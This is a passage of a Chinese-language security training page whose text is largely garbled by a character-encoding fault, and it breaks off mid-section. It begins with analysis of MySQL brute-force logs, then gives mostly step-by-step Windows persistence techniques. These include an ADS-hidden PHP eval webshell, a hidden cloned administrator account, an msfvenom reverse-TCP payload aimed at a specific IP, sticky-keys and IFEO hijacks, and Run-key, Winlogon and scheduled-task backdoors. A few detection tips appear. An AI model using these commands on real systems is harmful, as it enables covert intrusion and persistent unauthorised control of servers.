&#20363;&#22914; Connect root@localhost on &#24847;&#24605;&#23601;&#26159;&#36830;&#25509;&#25968;&#25454;&#24211;&#65292;&#20197;&#27492;&#31867;&#25512;&#65292;&#25509;&#19979;&#38754;&#30340;&#36830;&#19978;&#25968;&#25454;&#24211;&#20043;&#21518;&#65292;&#20570;&#20102;&#20160; &#20040;&#26597;&#35810;&#30340;&#25805;&#20316;&#12290;
</pre>
</div>
</div>
<div id="outline-container-org33fec2e" class="outline-4">
<h4 id="org33fec2e">Mysqlæš´åŠ›ç ´è§£æ—¥å¿—åˆ†æ</h4>
<div class="outline-text-4" id="text-org33fec2e">
<ul class="org-ul">
<li>æŸ¥çœ‹ç™»å½•æ—¥å¿—æ˜¯å¦å¼€å¯ï¼šshow variables like '%general%';<br></li>
<li>å‘ç°ç™»å½•æ—¥å¿—å…³é—­ï¼Œæ—¥å¿—æ–‡ä»¶ä½ç½®ä¸ºï¼šC:\phpstudy_pro\Extensions\MySQL5.7.26\data\Win7-PC.log<br></li>
<li>å¼€å¯ç™»å½•æ—¥å¿—ï¼šSET GLOBAL general_log='on';<br></li>
<li>åˆ©ç”¨hydraçˆ†ç ´Mysqlï¼Œç”ŸæˆWin7-PC.logæ—¥å¿—<br></li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">hydra 192.168.75.131 mysql -l root -P pwd.txt -vV
</pre>
</div>

<p>
ç™»å½•å¤±è´¥çš„è®°å½•ï¼šä¸ç®¡æ˜¯çˆ†ç ´å·¥å…·ã€Navicat for MySQLã€è¿˜æ˜¯å‘½ä»¤è¡Œï¼Œç™»å½•å¤±è´¥éƒ½æ˜¯ä¸€æ ·çš„è®°å½•ã€‚<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">80 Connect root@192.168.108.128 on using TCP/IP
80 Connect Access denied for user <span style="color: #8b2252;">'root'</span>@<span style="color: #8b2252;">'192.168.108.128'</span> (using password: YES)
</pre>
</div>

<p>
ç™»å½•æˆåŠŸçš„è®°å½•ï¼šä¸åŒçš„çˆ†ç ´å·¥å…·æˆ–è€…ç™»å½•æ–¹å¼ï¼Œæ˜¾ç¤ºå‡ºæ¥çš„å£ä»¤çŒœè§£æˆåŠŸçš„è®°å½•ä¼šæœ‰æ‰€å·®åˆ«ã€‚è¿™ä¸ªå·®åˆ«åœ¨äºï¼Œä¸åŒçš„æ•°æ®åº“è¿æ¥å·¥å…·ï¼Œå®ƒåœ¨è¿æ¥æ•°æ®åº“åˆå§‹åŒ–çš„è¿‡ç¨‹ä¸­æ˜¯ä¸åŒçš„ã€‚é€šè¿‡è¿™æ ·çš„å·®åˆ«ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åˆ¤æ–­å‡ºç”¨æˆ·è¿æ¥æ•°æ®åº“çš„æ–¹å¼ã€‚<br>
</p>

<p>
Navicat for MySQLç™»å½•ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">2022-11-06T13:49:03.648194Z 145 Connect root@LAPTOP-5NFOIJFJ on using TCP/IP
2022-11-06T13:49:03.648194Z 145 Query SET NAMES utf8mb4
2022-11-06T13:49:03.710594Z 145 Query SHOW VARIABLES LIKE <span style="color: #8b2252;">'lower_case_%'</span>;
2022-11-06T13:49:03.835394Z 145 Query SHOW VARIABLES LIKE <span style="color: #8b2252;">'sql_mode'</span>;
2022-11-06T13:49:03.882194Z 145 Query SELECT COUNT(*) AS support_ndb FROM information_schema.ENGINES WHERE Engine = <span style="color: #8b2252;">'ndbcluster'</span>
2022-11-06T13:49:03.897794Z 145 Query SELECT SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME, DEFAULT_COLLATION_NAME FROM
</pre>
</div>

<p>
å‘½ä»¤è¡Œç™»å½•ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">2022-11-06T13:49:03.648194Z 111 Connect root@localhost on 111 Query select @@version_comment limit 1
2022-11-06T13:49:03.710594Z 145 Quit
</pre>
</div>

<p>
è¿˜å¯ä»¥åˆ©ç”¨shellå‘½ä»¤è¿›è¡Œç®€å•çš„åˆ†æï¼š<br>
</p>

<p>
æœ‰å“ªäº›IPåœ¨çˆ†ç ´ï¼Ÿ<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep <span style="color: #8b2252;">"Access denied"</span> Win7-PC.log |cut -d <span style="color: #8b2252;">"'"</span> -f4 | uniq -c | sort -nr
  50 192.168.108.128
  20 LAPTOP-5NFOIJFJ
</pre>
</div>

<p>
å‘ç°192.168.108.128åœ¨çˆ†ç ´<br>
</p>

<p>
çˆ†ç ´çš„ç”¨æˆ·åå­—å…¸æ˜¯å“ªäº›ï¼Ÿ<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep <span style="color: #8b2252;">"Access denied"</span> Win7-PC.log |cut -d <span style="color: #8b2252;">"'"</span> -f2 | uniq -c | sort -nr
  70 root
</pre>
</div>

<p>
å‘ç°ç”¨æˆ·åå­—å…¸ä¸ºrootã€‚<br>
</p>
</div>
</div>
</div>
</section>
<section id="outline-container-orgd128d32" class="outline-2">
<h2 id="orgd128d32">æƒé™ç»´æŒ</h2>
<div class="outline-text-2" id="text-orgd128d32">
<p>
ä¸»è¦å†…å®¹ï¼š<br>
</p>
<ul class="org-ul">
<li>Windows æƒé™ç»´æŒ-éšè—<br></li>
<li>Windows æƒé™ç»´æŒ-åé—¨<br></li>
<li>Linux æƒé™ç»´æŒ-éšè—<br></li>
<li>Linux æƒé™ç»´æŒ-åé—¨<br></li>
<li>Windows å‘½ä»¤è¡Œæ–‡ä»¶ä¸‹è½½æ–¹å¼æ±‡æ€»<br></li>
<li>æ¸—é€æµ‹è¯•æ¡†æ¶æƒé™ç»´æŒæŠ€æœ¯<br></li>
<li>å¸¸è§ webshell ç®¡ç†å·¥å…·<br></li>
</ul>

<p>
æ‹¿åˆ°webshellåå¦‚ä½•ç»´æŠ¤è‡ªå·±çš„æƒé™ï¼Ÿ<br>
</p>
</div>
<div id="outline-container-org73e3e00" class="outline-3">
<h3 id="org73e3e00">Windowsæƒé™ç»´æŒ-éšè—ç¯‡</h3>
<div class="outline-text-3" id="text-org73e3e00">
<p>
<b>ä½¿ç”¨ç¯å¢ƒï¼šWindows Server 2008</b><br>
</p>
</div>
<div id="outline-container-org77d0234" class="outline-4">
<h4 id="org77d0234">éšè—æ–‡ä»¶</h4>
<div class="outline-text-4" id="text-org77d0234">
</div>
<div id="outline-container-org45e019c" class="outline-5">
<h5 id="org45e019c">æ–¹æ³•1-åˆ©ç”¨æ–‡ä»¶å±æ€§</h5>
<div class="outline-text-5" id="text-org45e019c">
<p>
æœ€ç®€å•çš„ä¸€ç§éšè—æ–‡ä»¶çš„æ–¹å¼ï¼Œæ–‡ä»¶å³é”®å±æ€§ï¼Œå‹¾é€‰éšè—ï¼Œç‚¹å‡»ç¡®å®šåï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œçœ‹ä¸åˆ°åˆšåˆšçš„æ–‡ä»¶äº†ã€‚<br>
</p>

<p>
è¿™æ ·å°±çœ‹ä¸è§one.php<br>
</p>

<p>
æŸ¥çœ‹â€œç»„ç»‡-æ–‡ä»¶å¤¹å’Œæœç´¢é€‰é¡¹â€æ˜¾ç¤ºéšè—æ–‡ä»¶å³å¯<br>
</p>

<p>
çœŸæ­£éšè—æ–‡ä»¶ï¼šä½¿ç”¨Attrib +s +a +h +rå‘½ä»¤å°±æ˜¯æŠŠåŸæœ¬çš„æ–‡ä»¶å¢åŠ äº†ç³»ç»Ÿæ–‡ä»¶å±æ€§ã€å­˜æ¡£æ–‡ä»¶å±æ€§ã€åªè¯»æ–‡ä»¶å±æ€§å’Œéšè—æ–‡ä»¶å±æ€§ã€‚<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">attrib +s +a +h +r one.php
</pre>
</div>

<p>
è¿™æ ·å°±åšåˆ°äº†çœŸæ­£çš„éšè—ï¼Œä¸ç®¡ä½ æ˜¯å¦æ˜¾ç¤ºéšè—æ–‡ä»¶ï¼Œåœ¨æ­¤æ–‡ä»¶å¤¹å†…éƒ½çœ‹ä¸è§ã€‚<br>
</p>

<p>
ç ´è§£éšè—æ–‡ä»¶ï¼š<br>
æ‰“å¼€ç”µè„‘æ–‡ä»¶å¤¹é€‰é¡¹å¡ï¼Œå–æ¶ˆâ€éšè—å—ä¿æŠ¤çš„æ“ä½œç³»ç»Ÿæ–‡ä»¶â€œå‹¾é€‰ï¼ŒæŠŠâ€éšè—æ–‡ä»¶å’Œæ–‡ä»¶å¤¹â€œä¸‹é¢çš„å•é€‰é€‰æ‹©â€œæ˜¾ç¤ºéšè—çš„æ–‡ä»¶ã€æ–‡ä»¶å¤¹å’Œé©±åŠ¨å™¨â€ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-org547468d" class="outline-5">
<h5 id="org547468d">æ–¹æ³•2-åˆ©ç”¨ADS(Alternate Data Streams)éšè—æ–‡ä»¶å†…å®¹</h5>
<div class="outline-text-5" id="text-org547468d">
<p>
ADSäº¤æ¢æ•°æ®æµï¼Œæ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨NTFSç³»ç»Ÿä¸­æ¯ä¸ªæ–‡ä»¶å¯ä»¥å­˜åœ¨å¤šä¸ªæ•°æ®æµï¼Œè¿™æ ·å¯ä»¥æŠŠå…¶å®ƒçš„æ–‡ä»¶å¯„å®¿åœ¨æŸä¸ªæ–‡ä»¶ä¸Šï¼Œåœ¨èµ„æºç®¡ç†å™¨ä¸­åªèƒ½çœ‹åˆ°ä¸€ä¸ªæ•°æ®æ–‡ä»¶è€Œçœ‹ä¸åˆ°å¯„å®¿æ–‡ä»¶ã€‚windowsç”µè„‘ç£ç›˜ä¸€èˆ¬éƒ½æ˜¯NTFSæ ¼å¼<br>
</p>

<p>
åœ¨æœåŠ¡å™¨ä¸Šechoä¸€ä¸ªæ•°æ®æµæ–‡ä»¶è¿›å»ï¼Œæ¯”å¦‚index.phpæ˜¯ç½‘é¡µæ­£å¸¸æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥è¿™ä¹ˆåšï¼š<br>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">echo</span> ^&lt;?php @eval($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'test'</span>]);?^&gt; &gt; index.php:hidden.jpg
</pre>
</div>



<figure id="org84e514d">
<img src="./images/img_20230814_173444.png" alt="img_20230814_173444.png" width="60%"><br>

</figure>

<p>
è¿™æ ·å­å°±ç”Ÿæˆäº†ä¸€ä¸ªä¸å¯è§çš„shell hidden.jpgï¼Œå¸¸è§„çš„æ–‡ä»¶ç®¡ç†å™¨ã€typeå‘½ä»¤ï¼Œdirå‘½ä»¤ã€delå‘½ä»¤å‘ç°éƒ½æ‰¾ä¸å‡ºhidden.jpgã€‚<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#38382;&#39064;1&#65306;&#22914;&#20309;&#26597;&#30475;index.php:hidden.jpg&#20869;&#23481;&#21602;&#65311;
&#36827;&#20837;&#25991;&#20214;&#25152;&#22312;&#30446;&#24405;&#65292;notepad index.php:hidden.jpg &#25110;&#32773; dir /r

&#38382;&#39064;2&#65306;&#22914;&#20309;&#21024;&#38500;index.php:hidden.jpg&#65311; &#23487;&#20027;&#25991;&#20214;&#27809;&#26377;&#20102;&#65292;&#23492;&#23487;&#25991;&#20214;&#20063;&#23601;&#27809;&#20102;&#12290;
&#30452;&#25509;&#21024;&#38500;index.php&#21363;&#21487;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-orge91be9c" class="outline-4">
<h4 id="orge91be9c">éšè—è´¦å·</h4>
<div class="outline-text-4" id="text-orge91be9c">
<p>
Windowséšè—ç³»ç»Ÿç”¨æˆ·æ“ä½œï¼ŒCMDå‘½ä»¤è¡Œä¸‹ï¼Œå»ºç«‹äº†ä¸€ä¸ªç”¨æˆ·åä¸ºtest$ï¼Œå¯†ç ä¸º111qqq!çš„ç®€å•éšè—è´¦æˆ·ï¼Œå¹¶ä¸”æŠŠè¯¥éšè—è´¦æˆ·æå‡ä¸ºç®¡ç†å‘˜æƒé™ã€‚<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">net user test$ 111qqq! /add <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21019;&#24314;&#38544;&#34255;&#36134;&#21495;</span>
net user
</pre>
</div>

<p>
CMDå‘½ä»¤è¡Œä½¿ç”¨"net user"ï¼Œçœ‹ä¸åˆ°"test$"è¿™ä¸ªè´¦å·ï¼Œä½†åœ¨æ§åˆ¶é¢æ¿å’Œæœ¬åœ°ç”¨æˆ·å’Œç»„æ˜¯å¯ä»¥æ˜¾ç¤ºæ­¤ç”¨æˆ·çš„ã€‚<br>
</p>

<p>
æƒ³è¦æŠŠè¯¥éšè—è´¦æˆ·æå‡ä¸ºç®¡ç†å‘˜æƒé™ï¼Œå¯ä»¥è¿›è¡Œè´¦å·å…‹éš†ã€‚<br>
</p>

<p>
å…‹éš†è´¦å·çš„åˆ¶ä½œè¿‡ç¨‹å¦‚ä¸‹ï¼š<br>
â€œå¼€å§‹â€â†’â€œè¿è¡Œâ€ï¼Œè¾“å…¥â€œregeditâ€åå›è½¦ï¼Œåˆ°â€œHKEY_LOCAL_MACHINE\SAM\SAMâ€ï¼Œä¼šå‘ç°æ— æ³•å±•å¼€è¯¥å¤„æ‰€åœ¨çš„é”®å€¼ã€‚è¿™æ˜¯å› ä¸ºç³»ç»Ÿé»˜è®¤å¯¹ç³»ç»Ÿç®¡ç†å‘˜ç»™äºˆ"å†™å…¥"å’Œ"è¯»å–æ§åˆ¶"æƒé™ï¼Œæ²¡æœ‰ç»™äºˆä¿®æ”¹æƒé™ï¼Œå› æ­¤æˆ‘ä»¬æ²¡æœ‰åŠæ³•å¯¹"SAM"é¡¹ä¸‹çš„é”®å€¼è¿›è¡ŒæŸ¥çœ‹å’Œä¿®æ”¹ã€‚å•æœºå³é”®æƒé™ï¼ŒæŠŠåä¸ºâ€œadministratorâ€çš„ç”¨æˆ·èµ‹äºˆå®Œå…¨æ§åˆ¶ä»¥åŠè¯»å–çš„æƒé™ï¼Œåœ¨åé¢æ‰“å‹¾å°±è¡Œï¼Œç„¶åå…³é—­æ³¨å†Œè¡¨ç¼–è¾‘å™¨ã€‚<br>
</p>


<figure id="org335550b">
<img src="./images/img_20230814_173716.png" alt="img_20230814_173716.png" width="60%"><br>

</figure>


<figure id="org350f7da">
<img src="./images/img_20230814_173737.png" alt="img_20230814_173737.png" width="60%"><br>

</figure>

<p>
å†æ¬¡æ‰“å¼€æ³¨å†Œè¡¨<br>
</p>


<figure id="orgee7cf6a">
<img src="./images/img_20230814_173800.png" alt="img_20230814_173800.png" width="60%"><br>

</figure>

<p>
å¤åˆ¶administratorçš„Få€¼åˆ°test$è´¦æˆ·<br>
</p>


<figure id="org2c5b56b">
<img src="./images/img_20230814_173846.png" alt="img_20230814_173846.png" width="60%"><br>

</figure>

<p>
åˆ©ç”¨test$/111qqq!è¿œç¨‹ç™»å½•ï¼Œå³æ˜¯administratoræƒé™ï¼Œä¸ºadministratoræ¡Œé¢ã€‚<br>
</p>


<figure id="org085ae25">
<img src="./images/img_20230814_173910.png" alt="img_20230814_173910.png" width="60%"><br>

</figure>

<p>
æ£€æµ‹å’Œæ¸…ç†æ–¹æ³•ï¼š<br>
ä½¿ç”¨Dç›¾_webæŸ¥æ€å·¥å…·ï¼Œä½¿ç”¨å…‹éš†è´¦å·æ£€æµ‹åŠŸèƒ½è¿›è¡ŒæŸ¥çœ‹ï¼Œå¯æ£€æµ‹å‡ºéšè—ã€å…‹éš†è´¦å·ã€‚<br>
</p>


<figure id="org97cdea8">
<img src="./images/img_20230814_173929.png" alt="img_20230814_173929.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-org8dc1eb6" class="outline-4">
<h4 id="org8dc1eb6">è¿›ç¨‹æ³¨å…¥</h4>
<div class="outline-text-4" id="text-org8dc1eb6">
<p>
ç”Ÿæˆä¸€ä¸ªmsfåé—¨<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color: #a0522d;">LHOST</span>=121.196.62.22 <span style="color: #a0522d;">LPORT</span>=7764 -f exe &gt;7764.exe
</pre>
</div>


<p>
è·å¾—ä¸€ä¸ªmeterpreterçš„shell<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">use exploit/multi/hander
<span style="color: #483d8b;">set</span> payload windows/x64/meterpreter/reverse_tcp
<span style="color: #483d8b;">set</span> LHOST 0.0.0.0
<span style="color: #483d8b;">set</span> LPORT 7764
exploit

meterpreter&gt; getuid
Server username: WIN-148\Administrator
</pre>
</div>

<p>
æŸ¥çœ‹è¿›ç¨‹<br>
</p>


<figure id="org5ef1612">
<img src="./images/img_20230814_174035.png" alt="img_20230814_174035.png" width="60%"><br>

</figure>

<p>
æ³¨å…¥è¿›ç¨‹ï¼Œgetuidå‘ç°æˆä¸ºäº†syetemæƒé™ã€‚<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">migrate 320 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36827;&#31243;&#36801;&#31227;&#65292;320&#20026;&#27491;&#24120;&#26381;&#21153;&#30340;&#36827;&#31243;&#21495;</span>
</pre>
</div>

<figure id="org14cd734">
<img src="./images/img_20230814_174050.png" alt="img_20230814_174050.png" width="60%"><br>

</figure>
</div>
</div>
</div>
<div id="outline-container-org08d8035" class="outline-3">
<h3 id="org08d8035">Windowsæƒé™ç»´æŒ-åé—¨ç¯‡</h3>
<div class="outline-text-3" id="text-org08d8035">
<p>
<b>ä½¿ç”¨ç¯å¢ƒï¼šWindows Server 2008</b><br>
</p>
</div>
<div id="outline-container-org3b62f55" class="outline-4">
<h4 id="org3b62f55">ç²˜æ»é”®åé—¨</h4>
<div class="outline-text-4" id="text-org3b62f55">
<p>
ç²˜æ»é”®æŒ‡çš„æ˜¯ç”µè„‘ä½¿ç”¨ä¸­çš„ä¸€ç§å¿«æ·é”®ï¼Œä¸“ä¸ºåŒæ—¶æŒ‰ä¸‹ä¸¤ä¸ªæˆ–å¤šä¸ªé”®æœ‰å›°éš¾çš„äººè€Œè®¾è®¡çš„ã€‚ç²˜æ»é”®çš„ä¸»è¦åŠŸèƒ½æ˜¯æ–¹ä¾¿Shiftç­‰é”®çš„ç»„åˆä½¿ç”¨ã€‚ä¸€èˆ¬çš„ç”µè„‘è¿æŒ‰äº”æ¬¡shiftä¼šå‡ºç°ç²˜æ»é”®æç¤ºã€‚sethc.exeå°±æ˜¯windowsä¸­ç²˜æ»é”®çš„è°ƒç”¨æ–‡ä»¶ã€‚<br>
</p>


<figure id="orgec8c2b6">
<img src="./images/img_20230816_165035.png" alt="img_20230816_165035.png" width="60%"><br>

</figure>

<p>
sethc.exeæ–‡ä»¶çš„å±æ€§ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯å±äºTrustedInstalleræ‰€æœ‰ï¼Œä¸ç®¡æ˜¯æ™®é€šç”¨æˆ·è¿˜æ˜¯administratoréƒ½æ²¡æœ‰æƒé™å¯¹å®ƒè¿›è¡Œç¼–è¾‘çš„ã€‚TrustedInstalleræ˜¯ä¸€ä¸ªå®‰å…¨æœºåˆ¶ï¼Œæƒé™æ¯”administratorç®¡ç†æƒé«˜ï¼Œä½†æ¯”systemä½ã€‚æ–‡ä»¶ä½ç½®åœ¨c:/Windows/Syste32ä¸­<br>
</p>

<p>
ä¿®æ”¹sethc.exeçš„å®‰å…¨è®¾ç½®å½“å‰æ‰€æœ‰è€…ä¸ºadministratorï¼Œå³é”®å±æ€§æ‰¾åˆ°å®‰å…¨ï¼Œåœ¨é«˜çº§ä¸­è®¾ç½®ã€‚<br>
</p>


<figure id="org6cddefc">
<img src="./images/img_20230816_165110.png" alt="img_20230816_165110.png" width="60%"><br>

</figure>

<p>
ä¿è¯administratorå¯¹sethc.exeå®Œå…¨æ§åˆ¶ï¼Œç‚¹å‡»å®‰å…¨é€‰é¡¹ä¸‹ç»„æˆ–ç”¨æˆ·åAdministratorç¼–è¾‘ï¼Œå‹¾é€‰å®Œå…¨æ§åˆ¶<br>
</p>


<figure id="orgc6e59ac">
<img src="./images/img_20230816_165126.png" alt="img_20230816_165126.png" width="60%"><br>

</figure>

<p>
ç²˜æ»é”®ä½ç½®ï¼šc:\windows\system32\sethc.exe<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">move sethc.exe sethc1.exe <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#21407;&#26412;&#30340;sethc&#25913;&#21517;&#20026;sethc1</span>
copy cmd.exe sethc.exe <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;cmd&#22797;&#21046;&#24182;&#37325;&#21629;&#21517;&#20026;sethc</span>
</pre>
</div>

<p>
æ­¤æ—¶åœ¨ç™»å½•ç•Œé¢è¿æŒ‰äº”æ¬¡shifté”®å³å¯å¯åŠ¨cmdï¼Œè€Œä¸”ä¸éœ€è¦ç™»å½•å°±å¯ä»¥æ‰§è¡Œã€‚<br>
</p>


<figure id="org63cc5b7">
<img src="./images/img_20230816_165211.png" alt="img_20230816_165211.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-org72d0f67" class="outline-4">
<h4 id="org72d0f67">Logon Scriptsåé—¨</h4>
<div class="outline-text-4" id="text-org72d0f67">
<p>
Logon Scriptsæ˜¯Windowsç™»å½•è„šæœ¬ï¼Œå½“ç”¨æˆ·ç™»å½•æ—¶è§¦å‘ï¼Œå®ƒèƒ½å¤Ÿä¼˜å…ˆäºæ€æ¯’è½¯ä»¶æ‰§è¡Œï¼Œä»è€Œç»•è¿‡æ€æ¯’è½¯ä»¶å¯¹æ•æ„Ÿæ“ä½œçš„æ‹¦æˆªã€‚<br>
</p>

<p>
æ³¨å†Œè¡¨ä½ç½®ï¼šHKEY_CURRENT_USER\Environment<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">REG ADD <span style="color: #8b2252;">"HKEY_CURRENT_USER\Environment"</span> /v UserInitMprLogonScript /t REG_SZ /d <span style="color: #8b2252;">"C:\Users\Administrator\Desktop\7764.exe"</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21019;&#24314;&#38190;&#20026;&#65306;UserInitMprLogonScript&#65292;&#20854;&#38190;&#20540;&#20026;&#25105;&#20204;&#35201;&#21551;&#21160;&#30340;&#31243;&#24207;&#36335;&#24452;</span>
</pre>
</div>


<figure id="org0464f77">
<img src="./images/img_20230816_165311.png" alt="img_20230816_165311.png" width="60%"><br>

</figure>

<p>
æ³¨é”€ä¹‹åé‡æ–°ç™»é™†æœåŠ¡å™¨ï¼Œå³å¯ä¸Šçº¿<br>
</p>


<figure id="orgc1a9d07">
<img src="./images/img_20230816_165335.png" alt="img_20230816_165335.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-org912ec54" class="outline-4">
<h4 id="org912ec54">æ˜ åƒåŠ«æŒ</h4>
<div class="outline-text-4" id="text-org912ec54">
<p>
â€œæ˜ åƒåŠ«æŒâ€ï¼Œä¹Ÿè¢«ç§°ä¸ºâ€œIFEOâ€ï¼ˆImage File Execution Optionsï¼‰ï¼Œåœ¨WindowsNTæ¶æ„çš„ç³»ç»Ÿé‡Œï¼ŒIFEOçš„æœ¬æ„æ˜¯ä¸ºä¸€äº›åœ¨é»˜è®¤ç³»ç»Ÿç¯å¢ƒä¸­è¿è¡Œæ—¶å¯èƒ½å¼•å‘é”™è¯¯çš„ç¨‹åºæ‰§è¡Œæä¾›ç‰¹æ®Šçš„ç¯å¢ƒè®¾å®šã€‚<br>
</p>

<p>
å½“ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºä½äºIFEOçš„æ§åˆ¶ä¸­æ—¶ï¼Œå®ƒçš„å†…å­˜åˆ†é…åˆ™æ ¹æ®è¯¥ç¨‹åºçš„å‚æ•°æ¥è®¾å®šï¼Œè€ŒWindowsNTæ¶æ„çš„ç³»ç»Ÿèƒ½é€šè¿‡è¿™ä¸ªæ³¨å†Œè¡¨é¡¹ä½¿ç”¨ä¸å¯æ‰§è¡Œç¨‹åºæ–‡ä»¶ååŒ¹é…çš„é¡¹ç›®ä½œä¸ºç¨‹åºè½½å…¥æ—¶çš„æ§åˆ¶ä¾æ®ï¼Œæœ€ç»ˆå¾—ä»¥è®¾å®šä¸€ä¸ªç¨‹åºçš„å †ç®¡ç†æœºåˆ¶å’Œä¸€äº›è¾…åŠ©æœºåˆ¶ç­‰ã€‚å‡ºäºç®€åŒ–åŸå› ï¼ŒIFEOä½¿ç”¨å¿½ç•¥è·¯å¾„çš„æ–¹å¼æ¥åŒ¹é…å®ƒæ‰€è¦æ§åˆ¶çš„ç¨‹åºæ–‡ä»¶åï¼Œæ‰€ä»¥ç¨‹åºæ— è®ºæ”¾åœ¨å“ªä¸ªè·¯å¾„ï¼Œåªè¦åå­—æ²¡æœ‰å˜åŒ–ï¼Œå®ƒçš„è¿è¡Œå°±ä¸ä¼šå‡ºé—®é¢˜ã€‚<br>
</p>

<p>
æ³¨å†Œè¡¨ä½ç½®ï¼šHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<br>
</p>

<p>
åœ¨æ­¤æ³¨å†Œè¡¨ä½ç½®æ·»åŠ é¡¹sethc.exeï¼Œæ·»åŠ debuggeré”®çš„å€¼ä¸ºc:\windows\system32\cmd.exe<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">reg add <span style="color: #8b2252;">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"</span> /v <span style="color: #8b2252;">"Debugger"</span> /t REG_SZ /d <span style="color: #8b2252;">"c:\windows\system32\cmd.exe"</span> /f
</pre>
</div>

<p>
æ­¤æ—¶ç‚¹å‡»äº”æ¬¡shifté”®ä¼šæ‰“å¼€cmdã€‚<br>
</p>
</div>
</div>
<div id="outline-container-org359e294" class="outline-4">
<h4 id="org359e294">æ³¨å†Œè¡¨è‡ªå¯åŠ¨åé—¨</h4>
<div class="outline-text-4" id="text-org359e294">
<p>
ä½ç½®ä¸€ï¼šHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>
</p>

<p>
æ·»åŠ é”®test1ï¼Œå€¼ä¸ºåé—¨ç¨‹åºè·¯å¾„ã€‚<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">REG ADD <span style="color: #8b2252;">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> /v test1 /t REG_SZ /d <span style="color: #8b2252;">"C:\Users\Administrator\Desktop\7764.exe"</span>
</pre>
</div>


<figure id="orgf4cea99">
<img src="./images/img_20230816_165846.png" alt="img_20230816_165846.png" width="60%"><br>

</figure>

<p>
é‡æ–°å¯åŠ¨ä¼šè‡ªåŠ¨è¿è¡Œåé—¨ç¨‹åºï¼Œä¸Šçº¿æˆåŠŸã€‚<br>
</p>


<figure id="org8fc9b28">
<img src="./images/img_20230816_165900.png" alt="img_20230816_165900.png" width="60%"><br>

</figure>

<p>
ä½ç½®äºŒï¼šHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br>
</p>

<p>
ä¿®æ”¹é”®Userinitçš„å€¼ï¼Œé‡å¯å°±ä¼šè‡ªåŠ¨è¿è¡Œç¨‹åºã€‚<br>
</p>

<p>
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br>
C:\Users\Administrator\Desktop\7764.exe<br>
</p>


<figure id="org0126332">
<img src="./images/img_20230816_165929.png" alt="img_20230816_165929.png" width="60%"><br>

</figure>

<p>
é‡æ–°å¯åŠ¨ä¼šè‡ªåŠ¨è¿è¡Œåé—¨ç¨‹åºï¼Œä¸Šçº¿æˆåŠŸã€‚<br>
</p>


<figure id="orge550f68">
<img src="./images/img_20230816_165945.png" alt="img_20230816_165945.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-orgf8a2af6" class="outline-4">
<h4 id="orgf8a2af6">è®¡åˆ’ä»»åŠ¡åé—¨</h4>
<div class="outline-text-4" id="text-orgf8a2af6">
<p>
schtaskså‘½ä»¤è®¾å®šè®¡åˆ’è‡ªå¯åŠ¨åé—¨ç¨‹åºã€‚<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">schtasks /Create /tn Updater /tr C:\Users\Administrator\Desktop\7764.exe /sc minute /mo 1 <span style="color: #b22222;">#</span><span style="color: #b22222;">&#27599;1&#20998;&#38047;&#33258;&#21160;&#25191;&#34892;7764.exe</span>
chcp 437 <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20462;&#25913;&#32534;&#30721;</span>
schtasks <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#35745;&#21010;&#20219;&#21153;</span>
</pre>
</div>


<figure id="org6bbdceb">
<img src="./images/img_20230816_170117.png" alt="img_20230816_170117.png" width="60%"><br>

</figure>

<p>
1åˆ†é’Ÿåæ”¶åˆ°ä¼šè¯<br>
</p>


<figure id="orgaaa06c1">
<img src="./images/img_20230816_170129.png" alt="img_20230816_170129.png" width="60%"><br>

</figure>

<p>
åˆ é™¤è®¡åˆ’ä»»åŠ¡ï¼š<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">schtasks /delete /tn Updater
</pre>
</div>
</div>
</div>
<div id="outline-container-org995c2c1" class="outline-4">
<h4 id="org995c2c1">æœåŠ¡è‡ªå¯åŠ¨åé—¨</h4>
<div class="outline-text-4" id="text-org995c2c1">
<p>
